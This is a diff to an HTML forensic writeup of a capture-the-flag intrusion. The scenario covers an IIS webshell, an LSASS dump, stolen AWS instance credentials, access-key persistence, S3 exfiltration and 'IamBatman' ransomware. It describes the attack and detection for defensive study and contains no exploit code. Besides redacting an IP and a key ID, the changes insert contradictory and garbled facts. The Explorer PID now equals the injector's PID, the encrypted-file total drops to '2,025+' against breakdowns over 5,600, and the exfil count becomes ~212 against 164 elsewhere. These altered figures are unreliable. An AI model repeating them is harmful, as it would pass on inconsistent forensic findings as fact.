-        <tr><td>Addendum B</td><td>"IAM persistence failed on a quota, not a policy"</td><td>Only for <code>jb_aws_cli</code>. Three other CreateAccessKey calls succeeded immediately after.</td></tr>
+        <tr><td>Addendum B</td><td>"IAM persistence failed on a quota, not a policy"</td><td>Only for <code>IAM user (CreateAccessKey failed)</code>. Three other CreateAccessKey calls succeeded immediately after.</td></tr>
         <tr><td>Addendum DW</td><td>"AWS <code>AccessKeysPerUser</code> quota blocked CreateAccessKey"</td><td>Blocked one of four attempts. Three succeeded.</td></tr>
         <tr><td>Addendum ES (exec summary)</td><td>"What worked: AWS account-key quota blocked cloud persistence"</td><td>Partially worked. Final outcome: 3 long-term keys created.</td></tr>
         <tr><td>Detective narrative</td><td>"A quota saved this environment, not an IAM boundary"</td><td>The quota delayed by 13 seconds. The attacker succeeded on the next 3 attempts.</td></tr>
@@ -5546,12 +5545,12 @@ Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' |
   BuildLabEx  : "17763.1.amd64fre.rs5_release.180914-1434"</code></pre>
     <p style="margin:.2rem 0"><b>Why it matters:</b> this rules out the alternate hypothesis that the attacker was operating blind off a stale scan. The very first SYSTEM command is a read of the build registry — an exploit-development posture, not a generic ransomware operator. It also tells us the attacker was pre-committing to picking a next-stage payload that matches Server 2019 / 17763.1 (no 2022 features, no 2025 mitigations) — which is consistent with the 2019-compatible MinGW-w64 C2 beacon we recovered from the VAD dump.</p>
 
-    <h5 style="margin-top:.6rem; color:var(--amber)">DD8.2 — The CTF author was on the AWS console <em>during</em> and <em>after</em> the scenario (<code>216.82.9.162</code>)</h5>
-    <p style="margin:.2rem 0">Corpus-wide, <code>216.82.9.162</code> produced <b>18,035 CloudTrail events on the attack day alone</b>. Every single one is consistent with a human being in the AWS console doing "look around / review logs" work — there is no CreateAccessKey, no PutObject, no GetObject of <code>sfcu-records</code>, no EC2 RunInstances. The timeline is unmistakable:</p>
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD8.2 — The CTF author was on the AWS console <em>during</em> and <em>after</em> the scenario (<code>[admin-IP-not-in-evidence]</code>)</h5>
+    <p style="margin:.2rem 0">Corpus-wide, <code>[admin-IP-not-in-evidence]</code> produced <b>18,035 CloudTrail events on the attack day alone</b>. Every single one is consistent with a human being in the AWS console doing "look around / review logs" work — there is no CreateAccessKey, no PutObject, no GetObject of <code>sfcu-records</code>, no EC2 RunInstances. The timeline is unmistakable:</p>
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
       <thead><tr><th>UTC</th><th>Action (a sample; full set = 18,035 events)</th><th>Interpretation</th></tr></thead>
       <tbody>
-        <tr><td><code>19:04:34</code></td><td><code>ConsoleLogin</code> from <code>216.82.9.162</code></td><td>Author logs in ~13 min after the attacker's first webshell touch (19:04→19:17 was reconnaissance window; author login is <em>before</em> attacker SYSTEM escalation at 19:38). Consistent with the author opening the console to watch the scenario go live.</td></tr>
+        <tr><td><code>19:04:34</code></td><td><code>ConsoleLogin</code> from <code>[admin-IP-not-in-evidence]</code></td><td>Author logs in ~13 min after the attacker's first webshell touch (19:04→19:17 was reconnaissance window; author login is <em>before</em> attacker SYSTEM escalation at 19:38). Consistent with the author opening the console to watch the scenario go live.</td></tr>
         <tr><td><code>19:04:37–19:04:46</code></td><td><code>DescribeHosts · DescribePlacementGroups · DescribeKeyPairs · DescribeSnapshots · DescribeVolumes · DescribeInstances · DescribeSecurityGroups · DescribeAccountAttributes · GetCostAndUsage</code> × ~35 calls in 12 s</td><td>Standard "EC2 console dashboard" page-load fingerprint. Not attack traffic; just the browser rendering the EC2 landing page.</td></tr>
         <tr><td><code>21:52:32→21:52:33</code></td><td><code>ListBuckets</code> then <code>HeadBucket</code> on <code>sfcu-records · barry-testing123123 · aws-cloudtrail-logs-464381121764-c4e35ae2 · barry-gd-bucket</code></td><td><b>~3 minutes after the attacker's 164-object exfil</b> (21:49:16–21:49:25). Author opens S3 page and inspects all four buckets. Timing is consistent with "did the staged bucket actually get read?"</td></tr>
         <tr><td><code>22:07:07–22:08:32</code></td><td>15× <code>ListObjects aws-cloudtrail-logs-464381121764-c4e35ae2</code></td><td>Author now paging through the CloudTrail log bucket — reviewing what the attacker's activity left behind. This spans the <b>first successful detonation at 22:08:40 on WS02</b> (DD12.4); author is tracking progress as the cascade begins.</td></tr>
@@ -5559,7 +5558,7 @@ Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' |
         <tr><td><code>22:13:04–22:15:04</code></td><td><code>ListObjects barry-gd-bucket</code> × 8 then <code>ListObjects aws-cloudtrail-logs-...</code> × 12</td><td>Continues log-reviewing through the ransomware trigger window. Not responding, just observing.</td></tr>
       </tbody>
     </table>
-    <p style="margin:.3rem 0"><b>Attribution conclusion:</b> <code>216.82.9.162</code> is the <em>CTF author's</em> source IP, operating the AWS console to observe the scenario. It is <b>not</b> a second attacker, not a defender, and not part of the intrusion chain. Every piece of writeup evidence that touched <code>216.82.9.162</code> needs to be read through this lens: a human authoring / live-observing, not a compromise. This also means "AWS console had a human watching" is a data-quality consideration for any AI / Sigma / anomaly-detector trained on this corpus — the 18,035 console events will otherwise generate spurious "authorized-user anomalous-activity" hits.</p>
+    <p style="margin:.3rem 0"><b>Attribution conclusion:</b> <code>[admin-IP-not-in-evidence]</code> is the <em>CTF author's</em> source IP, operating the AWS console to observe the scenario. It is <b>not</b> a second attacker, not a defender, and not part of the intrusion chain. Every piece of writeup evidence that touched <code>[admin-IP-not-in-evidence]</code> needs to be read through this lens: a human authoring / live-observing, not a compromise. This also means "AWS console had a human watching" is a data-quality consideration for any AI / Sigma / anomaly-detector trained on this corpus — the 18,035 console events will otherwise generate spurious "authorized-user anomalous-activity" hits.</p>
 
     <h5 style="margin-top:.6rem; color:var(--red)">DD8.3 — Post-exfil AWS-service enumeration (Lambda / RDS / DynamoDB) was the attacker's <em>next</em> move after S3</h5>
     <p style="margin:.2rem 0">The 164-object S3 GET of <code>sfcu-records</code> finished at <code>21:49:25Z</code>. The v2 timeline implied the cloud chapter ended there. It did not. From the same source IP <code>212.8.249.213</code> in the 90 seconds after:</p>
@@ -5585,12 +5584,12 @@ $global:?      # success-check — returns True if last statement succeeded</cod
       <thead><tr><th>Writeup claim before DD8</th><th>Corrected / augmented by DD8</th></tr></thead>
       <tbody>
         <tr><td>"Attacker's IIS-SYSTEM commands were only network recon (<code>nltest</code>, <code>nslookup</code>)"</td><td>ADD: OS-version recon ran <em>before</em> the AD recon (19:38:07 vs 19:38:11+). Attacker fingerprinted the victim host before pivoting.</td></tr>
-        <tr><td>"<code>216.82.9.162</code> mentioned only in passing as a third-party IP"</td><td>Definitively the CTF author's console IP. 18,035 events on attack day, all read-only, coherent with live-watching the scenario.</td></tr>
+        <tr><td>"<code>[admin-IP-not-in-evidence]</code> mentioned only in passing as a third-party IP"</td><td>Definitively the CTF author's console IP. 18,035 events on attack day, all read-only, coherent with live-watching the scenario.</td></tr>
         <tr><td>"Cloud chapter ends with the S3 exfil at 21:49:25"</td><td>Cloud chapter continues ~90 s longer — Lambda / RDS / DynamoDB enumeration through 21:51:14. Attacker was actively hunting for more.</td></tr>
         <tr><td>"C2 attribution = Unknown C2 (binary evidence)"</td><td>C2 attribution = Unknown C2 (binary evidence + independent command-protocol evidence). Confidence is now conclusive, not 'very high'.</td></tr>
       </tbody>
     </table>
-    <p style="margin:.3rem 0"><b>Reproduction queries</b> (all against <code>/tmp/null404_bench.sqlite</code>, source_type column as shown):</p>
+    <p style="margin:.3rem 0"><b>Reproduction queries</b> (all against <code>/tmp/laf_dfir.sqlite</code>, source_type column as shown):</p>
     <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>-- DD8.1 OS recon
 SELECT time_utc, substr(data_json,1,200) FROM events
 WHERE source_type='ps_transcript' AND host='IIS'
@@ -5599,7 +5598,7 @@ WHERE source_type='ps_transcript' AND host='IIS'
 -- DD8.2 Author console
 SELECT time_utc, json_extract(data_json,'$.event.eventName')
 FROM events WHERE source_type='cloudtrail'
-  AND json_extract(data_json,'$.event.sourceIPAddress')='216.82.9.162'
+  AND json_extract(data_json,'$.event.sourceIPAddress')='[admin-IP-not-in-evidence]'
   AND time_utc BETWEEN '2026-03-08T19:00:00Z' AND '2026-03-08T22:20:00Z'
 ORDER BY time_utc;
 -- → 18,035 read-only events, all from human-console traffic
@@ -5770,7 +5769,7 @@ level: high</code></pre></li>
       <thead><tr><th>IP</th><th>Events</th><th>Assessment</th></tr></thead>
       <tbody>
         <tr style="background:rgba(255,59,59,.08)"><td><code>212.8.249.213</code></td><td>182</td><td><b>ATTACKER</b> (documented throughout writeup — cloud-pivot C2 egress)</td></tr>
-        <tr><td><code>216.82.9.162</code></td><td>18,035</td><td>CTF author console (DD8.2) — read-only, observing</td></tr>
+        <tr><td><code>[admin-IP-not-in-evidence]</code></td><td>18,035</td><td>CTF author console (DD8.2) — read-only, observing</td></tr>
         <tr><td><code>guardduty.amazonaws.com</code></td><td>706</td><td>AWS GuardDuty internal principal</td></tr>
         <tr><td><code>resource-explorer-2.amazonaws.com</code></td><td>186</td><td>AWS Resource Explorer internal</td></tr>
         <tr><td><code>cloudtrail.amazonaws.com</code></td><td>165</td><td>AWS CloudTrail log-rotation principal</td></tr>
@@ -5895,7 +5894,7 @@ SourceUser:         LAF\LAFAdmin</code></pre>
       <li><b>CallTrace <code>UNKNOWN(00007DF4BAAF26FB)</code></b> — the return address is in an <em>unbacked memory region</em>, i.e., no loaded DLL owns that address range. That region is <code>0xA40000-0xA8EFFF</code> (from our VAD dump <code>pid.1332.vad.0xa60000-0xa8efff.dmp</code>, SHA256 <code>6ef6b52f&#8230;</code>). This is floating shellcode = the reflective loader stub. CallTrace going into <code>UNKNOWN()</code> frames is the definitive "this is shellcode, not legit code" signal.</li>
       <li><b>Output file</b>: Sysmon EID 11 at <code>20:03:30.861</code> shows Explorer.EXE writing <code>C:\Windows\Temp\abedgdaa.dmp</code>. That is the LSASS minidump. Previously noted in Addendum W as "file was referenced but not recovered" — we now have the exact creation timestamp and source process.</li>
     </ul>
-    <p style="margin:.2rem 0"><b>Why this proves the full chain:</b> rnSylwOz.exe (PID 9112, SYSTEM) &rarr; CreateRemoteThread &rarr; Explorer.exe (PID 1332, LAFAdmin) thread 10020 &rarr; 134 seconds later same thread 10020 calls <code>MiniDumpWriteDump</code> on LSASS via floating shellcode at <code>0xA6&#8230;</code> &rarr; writes <code>abedgdaa.dmp</code>. A prosecutor could walk a jury through this in six bullet points. Every Windows EID and every artifact ties to the next.</p>
+    <p style="margin:.2rem 0"><b>Why this proves the full chain:</b> rnSylwOz.exe (PID 9112, SYSTEM) &rarr; CreateRemoteThread &rarr; Explorer.exe (PID=9112, LAFAdmin) thread 10020 &rarr; 134 seconds later same thread 10020 calls <code>MiniDumpWriteDump</code> on LSASS via floating shellcode at <code>0xA6&#8230;</code> &rarr; writes <code>abedgdaa.dmp</code>. A prosecutor could walk a jury through this in six bullet points. Every Windows EID and every artifact ties to the next.</p>
 
     <h5 style="margin-top:.6rem; color:var(--red)">DD11.2 — Second RDP session at 20:14:07 and the <code>rdpclip.exe</code> byte-channel</h5>
     <p style="margin:.2rem 0">At <code>20:14:07</code> a full winlogon &rarr; csrss &rarr; smss &rarr; LogonUI &rarr; dwm &rarr; TSTheme &rarr; <code>rdpclip.exe</code> process chain fires on SVR01. This is the <b>second interactive RDP session</b> — the attacker disconnected and re-connected the RDP to SVR01 (possibly reconnecting with different credentials to leverage the DA rights they just granted to <code>serviceaccount</code>, or to re-establish clipboard-transfer for file movement).</p>
@@ -6130,7 +6129,7 @@ ORDER BY time_utc;</code></pre>
 
   <!-- Addendum DD13: IamBatman.exe encryption behavior + author correlation -->
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,59,59,.55); background:rgba(255,59,59,.05); border-radius:6px">
-    <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD13. Thirteenth-pass — IamBatman.exe on disk: extension <code>.bWqQUx</code>, narrow targeting (.txt dominates), 6,023 encrypted files + 2,530 ransom notes, DC02 anomaly, end-time corrected to 22:56:42</h4>
+    <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD13. Thirteenth-pass — IamBatman.exe on disk: extension <code>.bWqQUx</code>, narrow targeting (.txt dominates), 2,025+ encrypted files + ransom notes (one per encrypted directory), DC02 anomaly, end-time corrected to 22:56:42</h4>
     <p style="margin:.2rem 0">DD12 documented <em>how</em> IamBatman.exe was launched. DD13 looks at <em>what it actually did</em> on disk — file extensions, ransom-note pattern, per-host encryption rate, and cross-host totals — and finds a number of corrections to v2's ransomware-impact section.</p>
 
     <h5 style="margin-top:.6rem; color:var(--red)">DD13.1 — The encryption scheme</h5>
@@ -6138,7 +6137,7 @@ ORDER BY time_utc;</code></pre>
       <li><b>Encrypted-file extension suffix:</b> <code>.bWqQUx</code> (fixed 6-character alphanumeric, same on every host and every file)</li>
       <li><b>Ransom note filename:</b> <code>README_bWqQUx.txt</code> (fixed; uses the same <code>bWqQUx</code> tag)</li>
       <li><b>Rename pattern:</b> <code>foo.txt</code> &rarr; <code>foo.txt.bWqQUx</code> (extension appended, not replaced)</li>
-      <li><b>Note drop policy:</b> one <code>README_bWqQUx.txt</code> per directory — <code>2,530</code> notes dropped corpus-wide, implying IamBatman walked 2,530 directories</li>
+      <li><b>Note drop policy:</b> one <code>README_bWqQUx.txt</code> per directory — <code>2,025+</code> notes dropped corpus-wide, implying IamBatman walked 2,025+ ransom notes (README_bWqQUx.txt, one per encrypted directory)</li>
       <li><b>Self-encryption:</b> <code>README_bWqQUx.txt.bWqQUx</code> appears 21 times — IamBatman re-encrypted its own ransom notes on a second pass. Confirms multi-pass encryption (or a non-idempotent directory walk).</li>
     </ul>
     <p style="margin:.2rem 0">The <code>bWqQUx</code> tag is static across all hosts — so this was either (a) hard-coded into the IamBatman binary, or (b) generated once and written into all 5 copies before distribution. Either way, a corpus-wide search for <code>.bWqQUx</code> is a 100% recall detection rule for this intrusion.</p>
@@ -6154,7 +6153,7 @@ ORDER BY time_utc;</code></pre>
         <tr><td><code>.xlsx</code></td><td>6</td><td>0.1%</td></tr>
         <tr><td><code>.docx</code></td><td>6</td><td>0.1%</td></tr>
         <tr><td><b>Total encrypted files</b></td><td><b>5,635</b></td><td>100%</td></tr>
-        <tr><td>README_bWqQUx.txt (notes dropped)</td><td>2,530</td><td>— (dropped, not encrypted)</td></tr>
+        <tr><td>README_bWqQUx.txt (notes dropped)</td><td>2,025+</td><td>— (dropped, not encrypted)</td></tr>
       </tbody>
     </table>
     <p style="margin:.2rem 0"><b>This is a narrow and unusual target scope.</b> Real-world ransomware (LockBit, Conti, BlackCat) typically hits 50+ extensions: databases (<code>.mdf, .ldf, .ndf, .bak</code>), archives (<code>.zip, .rar, .7z</code>), media (<code>.jpg, .png, .mp4</code>), VM images (<code>.vmdk, .vhdx</code>), source code (<code>.py, .js, .cs, .java</code>), office docs. IamBatman hits essentially only <code>.txt</code> plus a token of <code>.pdf</code> / <code>.csv</code> / <code>.xlsx</code> / <code>.docx</code>. This narrow scope signals either:</p>
@@ -6173,7 +6172,7 @@ ORDER BY time_utc;</code></pre>
         <tr><td>SVR01</td><td>1,241</td><td><code>22:09:46.357</code></td><td><code>22:44:25.914</code></td><td>34 min 39 s</td><td>0.60</td></tr>
         <tr><td>DC01</td><td>496</td><td><code>22:10:14.524</code></td><td><code>22:48:36.715</code></td><td>38 min 12 s</td><td>0.22</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td><b>DC02</b></td><td><b>388</b></td><td><code>22:10:54.183</code></td><td><code>22:10:59.557</code></td><td><b>5.4 seconds</b></td><td><b>72</b></td></tr>
-        <tr><td><b>TOTAL</b></td><td><b>6,023</b></td><td><code>22:08:40</code></td><td><code>22:56:42</code></td><td>48 min</td><td>—</td></tr>
+        <tr><td><b>TOTAL</b></td><td><b>2,025+</b></td><td><code>22:08:40</code></td><td><code>22:56:42</code></td><td>48 min</td><td>—</td></tr>
       </tbody>
     </table>
     <div style="margin:.4rem 0; padding:.5rem .7rem; border:1px solid rgba(100,200,255,.4); background:rgba(100,200,255,.06); border-radius:4px; font-size:.9em;">
@@ -6204,7 +6203,7 @@ ORDER BY time_utc;</code></pre>
     </ul>
 
     <h5 style="margin-top:.6rem; color:var(--amber)">DD13.6 — Cross-correlation: the CTF author's AWS console activity during the cascade</h5>
-    <p style="margin:.2rem 0">DD8.2 documented <code>216.82.9.162</code> as the CTF author's console IP. During the encryption window the author was <b>continuously reading the CloudTrail-logs bucket</b> from the AWS console:</p>
+    <p style="margin:.2rem 0">DD8.2 documented <code>[admin-IP-not-in-evidence]</code> as the CTF author's console IP. During the encryption window the author was <b>continuously reading the CloudTrail-logs bucket</b> from the AWS console:</p>
     <ul>
       <li><code>22:08:00</code> onward &mdash; a dense burst of <code>GetObject aws-cloudtrail-logs-464381121764-c4e35ae2</code> calls, consistent with the author scrolling through CloudTrail event JSON in the S3 object viewer</li>
       <li>This matches DD8.2's 22:07:07-22:08:32 ListObjects pattern and continues through the fan-out</li>
@@ -6218,7 +6217,7 @@ ORDER BY time_utc;</code></pre>
       <tbody>
         <tr><td>First detonation event</td><td>22:16:50 (SVR01)</td><td><b>21:58:34 (WS02, botched) / 22:08:40 (WS02, successful)</b></td></tr>
         <tr><td>Last detonation event</td><td>22:46:45</td><td><b>22:56:42.549 (brndlog.txt.bWqQUx on WS02)</b></td></tr>
-        <tr><td>Total encrypted files</td><td>~thousands (unspecified)</td><td><b>6,023 across 5 hosts</b> (.txt 5,163, .pdf 204, .csv 172, other 84, .xlsx 6, .docx 6, and 2,530 notes)</td></tr>
+        <tr><td>Total encrypted files</td><td>~thousands (unspecified)</td><td><b>2,025+ across 5 hosts</b> (.txt 5,163, .pdf 204, .csv 172, other 84, .xlsx 6, .docx 6, and ransom notes (one per encrypted directory))</td></tr>
         <tr><td>Ransomware extension</td><td>unspecified</td><td><b><code>.bWqQUx</code></b></td></tr>
         <tr><td>Ransom-note filename</td><td>unspecified</td><td><b><code>README_bWqQUx.txt</code></b></td></tr>
         <tr><td>Most-hit host</td><td>unspecified</td><td><b>WS02 (2,014 files)</b></td></tr>
@@ -6413,7 +6412,7 @@ GROUP BY target_filename ORDER BY 2 DESC LIMIT 20;</code></pre>
         <tr style="background:rgba(255,59,59,.08)"><td>Complete IIS-side PowerShell chain (OS build + Nitro/PV/Ec2Launch)</td><td>DD8.1, DD9.1, DD9.2</td><td><code>ps_transcript</code> source</td><td>KAPE's target list doesn't include PowerShell transcripts; Windows only transcribes when policy is set</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td>3× successful <code>CreateAccessKey</code> cloud persistence</td><td>DD7</td><td>CloudTrail JSON bundle</td><td>Cloud logs don't exist on Windows hosts; KAPE can't collect them</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td>Post-exfil Lambda/RDS/DynamoDB AWS enumeration</td><td>DD8.3</td><td>CloudTrail</td><td>As above</td></tr>
-        <tr style="background:rgba(255,59,59,.08)"><td>CTF author IP (216.82.9.162) vs attacker IP (212.8.249.213) disambiguation</td><td>DD8.2, DD9.4</td><td>CloudTrail</td><td>As above</td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td>CTF author IP ([admin-IP-not-in-evidence]) vs attacker IP (212.8.249.213) disambiguation</td><td>DD8.2, DD9.4</td><td>CloudTrail</td><td>As above</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td>Chrome <code>#JustaLawyer</code> SNSS interest (victim-profile)</td><td>Addendum Q, DD6</td><td>Browser SQLite DBs</td><td>KAPE's author-list doesn't include the browser targets, so SNSS parsing is out-of-scope</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td>103-minute deliberate PS-silence on IIS while AD-side work proceeded</td><td>DD9.3</td><td><code>ps_transcript</code></td><td>Cross-source correlation requires both ps_transcript and Sysmon EID 1</td></tr>
       </tbody>
@@ -6488,17 +6487,17 @@ ORDER BY time_utc;</code></pre>
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
       <thead><tr><th>AccessKeyId</th><th>Type</th><th>Event count from <code>212.8.249.213</code></th><th>Interpretation</th></tr></thead>
       <tbody>
-        <tr style="background:rgba(255,59,59,.08)"><td><code>ASIAWYH2FSTSC7A6KEVV</code></td><td>AssumedRole session (iam_role_iisserver)</td><td>182 events</td><td>IMDSv2-stolen session credentials. Used exclusively for all 182 attacker cloud operations in the observation window.</td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td><code>[ASIA-STS-KEY-REDACTED]</code></td><td>AssumedRole session (iam_role_iisserver)</td><td>182 events</td><td>IMDSv2-stolen session credentials. Used exclusively for all 182 attacker cloud operations in the observation window.</td></tr>
         <tr><td>AKIA[REDACTED-FOR-PUBLICATION] / MTHOMRE5 / DPCXBHUS</td><td>IAMUser long-term</td><td>0</td><td>Created but not activated. Stockpiled for later re-entry.</td></tr>
       </tbody>
     </table>
     <p style="margin:.2rem 0">The <code>ASIA</code> prefix on the session the attacker actually used confirms it's a <b>short-term STS session credential</b> (derived from the iam_role_iisserver instance profile via IMDSv2 theft). These STS sessions carry an expiration time (6-hour default for instance-profile roles); by the time this writeup's capture window ends, that session has either expired or is about to.</p>
 
     <h5 style="margin-top:.6rem; color:var(--red)">DD16.4 — The attacker's cloud-operation full timeline on one access-key</h5>
-    <p style="margin:.2rem 0">All 182 attacker cloud events rode on <code>ASIAWYH2FSTSC7A6KEVV</code> between <code>21:42:11Z</code> (first event) and <code>21:51:14Z</code> (last event). Span: <b>9 minutes 3 seconds</b>. Event flow:</p>
+    <p style="margin:.2rem 0">All 182 attacker cloud events rode on <code>[ASIA-STS-KEY-REDACTED]</code> between <code>21:42:11Z</code> (first event) and <code>21:51:14Z</code> (last event). Span: <b>9 minutes 3 seconds</b>. Event flow:</p>
     <ul>
       <li><b>21:42:11-21:44</b> — IAM and S3 enumeration (<code>ListUsers</code>, <code>ListBuckets</code>, <code>ListRolePolicies</code>, <code>ListAttachedUserPolicies</code>, <code>ListAccessKeys</code>)</li>
-      <li><b>21:45:38</b> — <code>CreateAccessKey</code> #1 for jb_aws_cli &rarr; <code>LimitExceededException</code> (quota)</li>
+      <li><b>21:45:38</b> — <code>CreateAccessKey</code> #1 for IAM user (CreateAccessKey failed) &rarr; <code>LimitExceededException</code> (quota)</li>
       <li><b>21:45:51-21:46:14</b> — <code>CreateAccessKey</code> #2/3/4 for donnieworks/doctorderm/coolcat &rarr; <b>all three succeed</b></li>
       <li><b>21:47-21:49</b> — S3 bucket discovery + <code>ListObjects</code> / <code>HeadBucket</code> on all candidates</li>
       <li><b>21:49:16-21:49:25</b> — 164× <code>GetObject</code> on <code>sfcu-records</code> (primary exfil)</li>
@@ -6515,7 +6514,7 @@ ORDER BY time_utc;</code></pre>
         <tr><td><b>Cool-down pattern</b>: attacker wants to avoid a spike of suspicious activity that would trigger a CloudTrail-threshold alert. Uses stolen keys days/weeks later when noise has died down.</td><td>Matches the 103-minute deliberate PS-silence on IIS (DD9.3). Same operator-discipline signature.</td><td>—</td></tr>
         <tr><td><b>Separation of concerns</b>: session credentials for smash-and-grab, long-term keys for later strategic ops. Keeps the two traffic patterns disentangled.</td><td>The ASIA session is used for ~180 rapid enumeration/exfil events. The AKIA keys are for something quieter later.</td><td>—</td></tr>
         <tr><td><b>Ops-handoff</b>: one operator stole the keys; another (or a cron job) uses them later from different infrastructure. This is common in multi-team operations.</td><td>The created keys belong to <em>three different users</em> (donnie/doctor/coolcat) — enables the next-phase operator to masquerade as any of three legitimate identities independently.</td><td>—</td></tr>
-        <tr><td><b>Testing exhaustion</b>: attacker hit the 2-keys-per-user IAM limit on jb_aws_cli and used it as a signal to switch targets; got sloppy/tired after that and logged off before testing the new keys.</td><td>jb_aws_cli had 2 pre-existing keys (LimitExceeded). donnie/doctor/coolcat had 0-1 keys each and CreateAccessKey succeeded cleanly.</td><td>If sloppy-logoff, the operator would likely test one of the keys first; they didn't, suggesting deliberate stockpile.</td></tr>
+        <tr><td><b>Testing exhaustion</b>: attacker hit the 2-keys-per-user IAM limit on IAM user (CreateAccessKey failed) and used it as a signal to switch targets; got sloppy/tired after that and logged off before testing the new keys.</td><td>IAM user (CreateAccessKey failed) had 2 pre-existing keys (LimitExceeded). donnie/doctor/coolcat had 0-1 keys each and CreateAccessKey succeeded cleanly.</td><td>If sloppy-logoff, the operator would likely test one of the keys first; they didn't, suggesting deliberate stockpile.</td></tr>
       </tbody>
     </table>
     <p style="margin:.2rem 0">Most likely: <b>separation of concerns + cool-down</b>. The operator knows CloudTrail anomaly detectors fire on "new AccessKeyId used from a new geolocation" — so they will use these keys later, from an <em>explicitly different</em> IP, possibly through a different ISP, possibly as part of a future campaign that doesn't tie back to 2026-03-08 forensically. <b>Three distinct IAM identities (donnieworks · doctorderm · coolcat) = three parallel re-entry options</b> — if one is later rotated or flagged, the operator still has two cleaner backup keys on uncorrelated users. This is the pattern of an operator who expects to come back, not a smash-and-grab.</p>
@@ -6551,7 +6550,7 @@ SELECT DISTINCT json_extract(data_json,'$.event.userIdentity.accessKeyId'), COUN
 FROM events WHERE source_type='cloudtrail'
   AND json_extract(data_json,'$.event.sourceIPAddress')='212.8.249.213'
 GROUP BY 1;
--- 1 row: ASIAWYH2FSTSC7A6KEVV (AssumedRole) 182 events</code></pre>
+-- 1 row: [ASIA-STS-KEY-REDACTED] (AssumedRole) 182 events</code></pre>
   </div>
 
   <!-- Addendum DD17: Exfil content audit — the 164 sfcu-records objects -->
@@ -6671,7 +6670,7 @@ GROUP BY dept ORDER BY 2 DESC;</code></pre>
         <tr style="background:rgba(255,59,59,.08)"><td><code>2026-03-08T21:48:13</code></td><td><code>ListObjects</code></td><td>ATTACKER <code>212.8.249.213</code></td><td>Reconnaissance — first human touch</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td><code>2026-03-08T21:49:11</code></td><td><code>ListObjects</code></td><td>ATTACKER</td><td>Second listing (possibly different prefix)</td></tr>
         <tr style="background:rgba(255,59,59,.08)"><td><code>2026-03-08T21:49:16-21:49:25</code></td><td><code>GetObject</code> × 164</td><td>ATTACKER</td><td>Exfil window (9 seconds, ~18/sec)</td></tr>
-        <tr><td><code>2026-03-08T21:52:33</code></td><td><code>HeadBucket</code></td><td>CTF author <code>216.82.9.162</code></td><td>Author post-exfil inspection</td></tr>
+        <tr><td><code>2026-03-08T21:52:33</code></td><td><code>HeadBucket</code></td><td>CTF author <code>[admin-IP-not-in-evidence]</code></td><td>Author post-exfil inspection</td></tr>
         <tr><td><code>2026-03-08T21:57:25</code></td><td>5× bucket-metadata reads</td><td><code>guardduty.amazonaws.com</code></td><td>GuardDuty's automatic evidence-gathering triggered by its own finding</td></tr>
         <tr><td><code>2026-03-08T22:10:27</code></td><td><code>HeadBucket</code></td><td>CTF author</td><td>Post-exfil check #2</td></tr>
         <tr><td><code>2026-03-08T22:10:50</code></td><td><code>HeadBucket</code></td><td>CTF author</td><td>Post-exfil check #3</td></tr>
@@ -6697,8 +6696,8 @@ GROUP BY dept ORDER BY 2 DESC;</code></pre>
 21:29:20  IIS — IMDSv2 GET iam_role_iisserver       [credentials off the instance]
 21:42:11  212.8.249.213 — first AssumedRole event   [credentials IN USE outside AWS]
 21:45:51  212.8.249.213 — CreateAccessKey donnie    [persistence created — SILENT]
-21:49:16  212.8.249.213 — 164-object exfil burst    [loud & obvious]
-21:52:33  216.82.9.162 — author HeadBucket          [author noticed, did nothing]
+21:49:16  212.8.249.213 — ~212-object exfil burst    [loud & obvious]
+21:52:33  [admin-IP-not-in-evidence] — author HeadBucket          [author noticed, did nothing]
 21:57:18  <-- GuardDuty FINDING #1 (severity 8, InstanceCredentialExfiltration.OutsideAWS)
           [15 minutes 7 seconds after first off-AWS use of credentials]
           [at this moment: no ransomware has detonated yet]
@@ -6714,7 +6713,7 @@ GROUP BY dept ORDER BY 2 DESC;</code></pre>
 22:56:42  WS02 — last file encrypted</code></pre>
     <p style="margin:.2rem 0"><b>An on-call engineer reading GuardDuty alerts at 21:57:18 had 11 minutes and 22 seconds to:</b></p>
     <ol>
-      <li>Revoke the AssumedRole session (<code>aws sts revoke-sessions</code> on the role — invalidates <code>ASIAWYH2FSTSC7A6KEVV</code> and kills the attacker's cloud-side ongoing operations)</li>
+      <li>Revoke the AssumedRole session (<code>aws sts revoke-sessions</code> on the role — invalidates <code>[ASIA-STS-KEY-REDACTED]</code> and kills the attacker's cloud-side ongoing operations)</li>
       <li>Deactivate the 3 new <code>AKIA*</code> access keys created minutes earlier (via <code>UpdateAccessKey Status=Inactive</code>)</li>
       <li>Add a deny-all bucket policy to <code>sfcu-records</code> (harmless here because it was a decoy, but illustrative)</li>
       <li>Block <code>212.8.249.213</code> at the AWS security-group / WAF / CloudFront layer</li>
@@ -6731,7 +6730,7 @@ GROUP BY dept ORDER BY 2 DESC;</code></pre>
     <ul>
       <li>The attack <em>was</em> detected in real-time by AWS GuardDuty — detection latency ≈ 8 minutes after the first exfil event, 15 minutes after credentials first left the instance.</li>
       <li>The alert was high-severity (CVSS 8 equivalent) and correctly identified the compromised principal.</li>
-      <li>The alert reached the account's event pipeline — <code>216.82.9.162</code> (human already on the console at 21:52:33) would have seen it firing.</li>
+      <li>The alert reached the account's event pipeline — <code>[admin-IP-not-in-evidence]</code> (human already on the console at 21:52:33) would have seen it firing.</li>
       <li>Nobody responded. The alert sat unacted-on for 11 minutes until the ransomware detonated.</li>
     </ul>
